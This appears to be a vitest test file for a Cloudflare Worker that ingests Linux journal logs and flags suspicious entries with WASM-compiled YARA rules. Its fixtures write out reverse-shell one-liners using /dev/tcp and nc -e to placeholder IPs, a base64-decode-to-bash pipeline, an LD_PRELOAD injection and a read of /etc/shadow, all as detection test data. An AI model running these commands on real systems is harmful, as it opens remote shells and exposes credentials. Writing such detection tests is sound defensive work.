import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { TelemetryLogRecord } from "../src/normalize";
import defaultHandler, { createIngestHandler, IngestEnv } from "../src/index";
import { WasmYaraDetector } from "../src/yara";

const workerDir = resolve(import.meta.dirname, "..");
const repoRoot = resolve(workerDir, "../../..");

const wasmBytes = readFileSync(resolve(workerDir, "src/wasm/oof_yara_wasm.wasm"));
const wasmModule = new WebAssembly.Module(wasmBytes);
const workerRuleSource = readFileSync(
  resolve(workerDir, "src/rules/linux_journal_core.yar"),
  "utf8",
);
const canonicalRuleSource = readFileSync(
  resolve(repoRoot, "rules/yara/linux_journal_core.yar"),
  "utf8",
);

interface BasinField {
  name: string;
  type: "string" | "int32" | "int64" | "boolean" | "list";
  required: boolean;
  items?: { type: string };
}

interface BasinSchema {
  fields: BasinField[];
}

const basinSchema = JSON.parse(
  readFileSync(resolve(repoRoot, "contracts/schemas/journal-logs.basin.json"), "utf8"),
) as BasinSchema;

function assertMatchesBasinSchema(record: TelemetryLogRecord): void {
  expect(basinSchema.fields).toHaveLength(24);
  const schemaNames = basinSchema.fields.map((f) => f.name).sort();
  expect(Object.keys(record).sort()).toEqual(schemaNames);

  const rec = record as unknown as Record<string, unknown>;
  for (const field of basinSchema.fields) {
    const val = rec[field.name];
    if (field.required) {
      expect(val, `required field ${field.name} must not be null/undefined`).not.toBeNull();
      expect(val, `required field ${field.name} must not be undefined`).not.toBeUndefined();
    } else if (val === null) {
      continue;
    }

    switch (field.type) {
      case "string":
        expect(typeof val, `${field.name} should be string`).toBe("string");
        break;
      case "boolean":
        expect(typeof val, `${field.name} should be boolean`).toBe("boolean");
        break;
      case "int32":
        expect(typeof val, `${field.name} should be int32 number`).toBe("number");
        expect(Number.isInteger(val)).toBe(true);
        expect(val as number).toBeGreaterThanOrEqual(-2147483648);
        expect(val as number).toBeLessThanOrEqual(2147483647);
        break;
      case "int64":
        expect(typeof val, `${field.name} should be safe int64 number`).toBe("number");
        expect(Number.isSafeInteger(val)).toBe(true);
        break;
      case "list":
        expect(Array.isArray(val), `${field.name} should be array`).toBe(true);
        if (field.items?.type === "string") {
          for (const item of val as unknown[]) {
            expect(typeof item).toBe("string");
          }
        }
        break;
    }
  }
}

function makeTestHarness(overrides: Partial<IngestEnv> = {}) {
  const sentBatches: TelemetryLogRecord[][] = [];
  const env: IngestEnv = {
    INGEST_AUTH_TOKEN: "test-secret-token-12345",
    TELEMETRY_STREAM: {
      async send(records: TelemetryLogRecord[]) {
        sentBatches.push(records);
      },
    },
    ...overrides,
  };
  const handler = createIngestHandler({
    wasmModule,
    ruleSource: workerRuleSource,
  });
  return { handler, env, sentBatches };
}

async function gzipBytes(input: Uint8Array): Promise<Uint8Array> {
  const stream = new Blob([Buffer.from(input)])
    .stream()
    .pipeThrough(new CompressionStream("gzip") as unknown as TransformStream<Uint8Array, Uint8Array>);
  return new Uint8Array(await new Response(stream).arrayBuffer());
}

describe("Cloudflare Worker Basin Ingest + WASM YARA", () => {
  it("keeps worker rule bundle synchronized with canonical rules/yara", () => {
    expect(workerRuleSource).toBe(canonicalRuleSource);
  });

  it("works via default Worker export with static .wasm and .yar imports", async () => {
    const sent: TelemetryLogRecord[][] = [];
    const env: IngestEnv = {
      INGEST_AUTH_TOKEN: "test-secret-token-12345",
      TELEMETRY_STREAM: {
        async send(records) {
          sent.push(records);
        },
      },
    };
    const res = await defaultHandler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: JSON.stringify({ host: "default-export-host", message: "bash -i >& /dev/tcp/10.0.0.1/4444" }),
      }),
      env,
    );
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    expect(sent[0]![0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
  });

  it("responds ok on GET /healthz", async () => {
    const { handler, env } = makeTestHarness();
    const res = await handler.fetch(new Request("https://ingest.example/healthz"), env);
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ status: "ok", detector: "yara-wasm" });
  });

  it("normalizes raw systemd-journald JSON with byte-array MESSAGE and detects reverse shell", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const rawMsgBytes = Array.from(
      new Uint8Array([0xff, 0xfe, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "utf8")]),
    );
    const realtimeUs = "1731643200123456";
    const expectedIso = new Date(Number(BigInt(realtimeUs) / 1000n)).toISOString();

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: {
        authorization: "Bearer test-secret-token-12345",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        __CURSOR: "s=abc;i=1",
        __REALTIME_TIMESTAMP: realtimeUs,
        _HOSTNAME: "prod-web-01",
        _SYSTEMD_UNIT: "bash.service",
        SYSLOG_IDENTIFIER: "bash",
        _TRANSPORT: "stdout",
        PRIORITY: "3",
        _PID: "4242",
        _UID: "1000",
        _COMM: "bash",
        _EXE: "/bin/bash",
        _CMDLINE: "bash -c id",
        _BOOT_ID: "boot-1",
        _MACHINE_ID: "mach-1",
        TRACE_ID: "4bf92f3577b34da6a3ce929d0e0e4736",
        SPAN_ID: "00f067aa0ba902b7",
        MESSAGE: rawMsgBytes,
      }),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    expect(sentBatches).toHaveLength(1);

    const record = sentBatches[0]![0]!;
    assertMatchesBasinSchema(record);
    expect(record.event_id).toBe("s=abc;i=1");
    expect(record.event_time).toBe(expectedIso);
    expect(record.host).toBe("prod-web-01");
    expect(record.service_name).toBe("bash.service");
    expect(record.priority).toBe(3);
    expect(record.severity).toBe("ERR");
    expect(record.pid).toBe(4242);
    expect(record.uid).toBe(1000);
    expect(record.trace_id).toBe("4bf92f3577b34da6a3ce929d0e0e4736");
    expect(record.span_id).toBe("00f067aa0ba902b7");
    expect(record.yara_matched).toBe(true);
    expect(record.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
    expect(record.yara_tags).toContain("reverse_shell");
  });

  it("processes Vector NDJSON batches, merges host-agent YARA hits, and preserves benign logs", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const ndjson = [
      JSON.stringify({
        host: "app-node-02",
        service_name: "nginx.service",
        systemd_unit: "nginx.service",
        priority: 6,
        message: "GET /healthz 200 OK",
      }),
      JSON.stringify({
        host: "app-node-02",
        systemd_unit: "cron.service",
        priority: 4,
        cmdline: "echo aGVsbG8td29ybGQtcGF5bG9hZA== | base64 -d | bash",
        message: "cron job executed command",
      }),
      JSON.stringify({
        host: "app-node-02",
        systemd_unit: "custom-agent.service",
        priority: 2,
        message: "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        yara_rules: ["Host_Kunai_Preload"],
        yara_tags: ["kunai"],
      }),
    ].join("\n");

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: ndjson,
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 3, matched: 2 });

    const records = sentBatches[0]!;
    expect(records).toHaveLength(3);
    for (const rec of records) {
      assertMatchesBasinSchema(rec);
    }

    expect(records[0]!.yara_matched).toBe(false);
    expect(records[0]!.yara_rules).toEqual([]);
    expect(records[1]!.yara_matched).toBe(true);
    expect(records[1]!.yara_rules).toEqual(["Linux_Encoded_Command_Execution"]);
    expect(records[2]!.yara_matched).toBe(true);
    expect(records[2]!.yara_rules).toEqual([
      "Host_Kunai_Preload",
      "Linux_Suspicious_Runtime_Injection",
    ]);
    expect(records[2]!.yara_tags).toContain("kunai");
    expect(records[2]!.yara_tags).toContain("privilege_escalation");
  });

  it("evaluates external YARA symbols passed from journald metadata", async () => {
    const customRule = `
rule SSHD_Brute_Force : auth {
  strings:
    $msg = "Failed password"
  condition:
    systemd_unit == "sshd.service" and priority <= 4 and $msg
}
`;
    const { handler, env, sentBatches } = makeTestHarness({
      YARA_RULES_TEXT: customRule,
    });

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: JSON.stringify([
        { _SYSTEMD_UNIT: "sshd.service", PRIORITY: "4", MESSAGE: "Failed password for admin" },
        { _SYSTEMD_UNIT: "app.service", PRIORITY: "4", MESSAGE: "Failed password for admin" },
      ]),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 2, matched: 1 });
    expect(sentBatches[0]![0]!.yara_rules).toEqual(["SSHD_Brute_Force"]);
    expect(sentBatches[0]![1]!.yara_rules).toEqual([]);
  });

  it("handles textual syslog priorities and null message fallback to MESSAGE", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: JSON.stringify({
        host: "edge-host-1",
        priority: "error",
        message: null,
        MESSAGE: "cat /etc/shadow attempt",
      }),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    const rec = sentBatches[0]![0]!;
    assertMatchesBasinSchema(rec);
    expect(rec.priority).toBe(3);
    expect(rec.severity).toBe("ERR");
    expect(rec.message).toBe("cat /etc/shadow attempt");
    expect(rec.yara_rules).toContain("Linux_Credential_Access_Attempt");
  });

  it("enforces auth, routing, gzip decompression, body size caps, and upstream error propagation", async () => {
    const { handler, env } = makeTestHarness();

    // Missing server token -> 500
    const noConfigRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer x" },
        body: "{}",
      }),
      { ...env, INGEST_AUTH_TOKEN: "   " },
    );
    expect(noConfigRes.status).toBe(500);

    // Wrong auth -> 401
    const unauthRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer wrong-token" },
        body: "{}",
      }),
      env,
    );
    expect(unauthRes.status).toBe(401);

    // Wrong route / method
    expect(
      (await handler.fetch(new Request("https://ingest.example/nope"), env)).status,
    ).toBe(404);
    expect(
      (await handler.fetch(new Request("https://ingest.example/v1/logs", { method: "GET" }), env))
        .status,
    ).toBe(405);

    // Invalid / empty payloads -> 400
    for (const badBody of ["", "[]", "[null]", "{not-json", "{\"a\":1}\n[1,2]"]) {
      const badRes = await handler.fetch(
        new Request("https://ingest.example/v1/logs", {
          method: "POST",
          headers: { authorization: "Bearer test-secret-token-12345" },
          body: badBody,
        }),
        env,
      );
      expect(badRes.status, `body ${badBody} should return 400`).toBe(400);
    }

    // Unsupported Content-Encoding -> 415
    const brRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "br",
        },
        body: "{}",
      }),
      env,
    );
    expect(brRes.status).toBe(415);

    // Valid gzipped payload -> 202
    const gzValid = await gzipBytes(
      Buffer.from(JSON.stringify({ host: "gz-host", message: "cat /etc/shadow" }), "utf8"),
    );
    const gzRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "gzip",
        },
        body: Buffer.from(gzValid),
      }),
      env,
    );
    expect(gzRes.status).toBe(202);
    expect(await gzRes.json()).toEqual({ accepted: 1, matched: 1 });

    // Gzip bomb exceeding 5 MiB uncompressed -> 413
    const hugeJson = JSON.stringify({ host: "gz-bomb", message: "A".repeat(5 * 1024 * 1024 + 1024) });
    const gzBomb = await gzipBytes(Buffer.from(hugeJson, "utf8"));
    const bombRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "gzip",
        },
        body: Buffer.from(gzBomb),
      }),
      env,
    );
    expect(bombRes.status).toBe(413);

    // Streamed uncompressed body > 5 MiB without Content-Length -> 413
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        const chunk = new Uint8Array(1024 * 1024);
        chunk.fill(0x61);
        for (let i = 0; i < 6; i++) {
          controller.enqueue(chunk);
        }
        controller.close();
      },
    });
    const tooBigRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: stream,
        // @ts-expect-error Node fetch requires duplex for streaming request bodies
        duplex: "half",
      }),
      env,
    );
    expect(tooBigRes.status).toBe(413);

    // Upstream Basin stream failure -> 502
    const failEnv: IngestEnv = {
      INGEST_AUTH_TOKEN: "test-secret-token-12345",
      TELEMETRY_STREAM: {
        async send() {
          throw new Error("Basin pipeline temporarily unavailable");
        },
      },
    };
    const failRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: JSON.stringify({ host: "h1", message: "ok" }),
      }),
      failEnv,
    );
    expect(failRes.status).toBe(502);
  });

  it("maintains bounded WASM heap across 500 repeated scans including empty and oversized payloads", () => {
    const detector = new WasmYaraDetector(wasmModule, workerRuleSource);
    const symbols = {
      systemd_unit: "test.service",
      syslog_identifier: "test",
      transport: "stdout",
      comm: "sh",
      exe: "/bin/sh",
      host: "bench-host",
      priority: 6,
    };
    const empty = new Uint8Array(0);
    const benign = new TextEncoder().encode("normal operational log line");
    const malicious = new TextEncoder().encode("nc -e /bin/sh 192.0.2.1 4444");
    const oversized = new Uint8Array(100 * 1024);
    oversized.fill(0x41);

    try {
      for (let i = 0; i < 500; i++) {
        expect(detector.scan(empty, symbols)).toEqual([]);
        expect(detector.scan(benign, symbols)).toEqual([]);
        const hits = detector.scan(malicious, symbols);
        expect(hits).toHaveLength(1);
        expect(hits[0]!.name).toBe("Linux_Reverse_Shell_Indicator");
        expect(detector.scan(oversized, symbols)).toEqual([]);
      }
    } finally {
      detector.dispose();
    }
  });
});
